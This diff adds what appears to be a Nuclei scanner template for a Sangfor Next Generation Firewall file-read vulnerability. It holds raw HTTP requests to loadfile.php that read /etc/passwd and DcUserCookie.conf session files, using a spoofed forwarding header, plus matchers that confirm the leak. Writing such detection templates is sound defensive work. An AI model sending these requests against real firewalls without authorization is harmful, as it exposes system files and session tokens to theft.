@@ -1,0 +1,52 @@
+id: sangfor-ngaf-file-read
+info:
+  name: Sangfor Next Generation Firewall File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Sangfor Next Generation Firewall has a file reading vulnerability in `loadfile.php`. An attacker can use this vulnerability to read important system files, such as database configuration files, causing the system to be in an unsafe state.
+  reference:
+    - https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 7.5
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1
+        Host: {{Hostname}}
+        Y-Forwarded-For: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
+  - raw:
+      - |
+        GET /svpn_html/loadfile.php?file=/etc/sinfor/DcUserCookie.conf HTTP/1.1
+        Host: {{Hostname}}
+        Y-Forwarded-For: 127.0.0.1
+      - |
+        GET /svpn_html/loadfile.php?file=/etc/en/sinfor/DcUserCookie.conf HTTP/1.1
+        Host: {{Hostname}}
+        Y-Forwarded-For: 127.0.0.1
+      - |
+        GET /svpn_html/loadfile.php?file=/config/etc/sinfor/DcUserCookie.conf HTTP/1.1
+        Host: {{Hostname}}
+        Y-Forwarded-For: 127.0.0.1
+      - |
+        GET /svpn_html/loadfile.php?file=/config/etc/en/sinfor/DcUserCookie.conf HTTP/1.1
+        Host: {{Hostname}}
+        Y-Forwarded-For: 127.0.0.1
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "session_id=.+"
+    stop-at-first-match: true
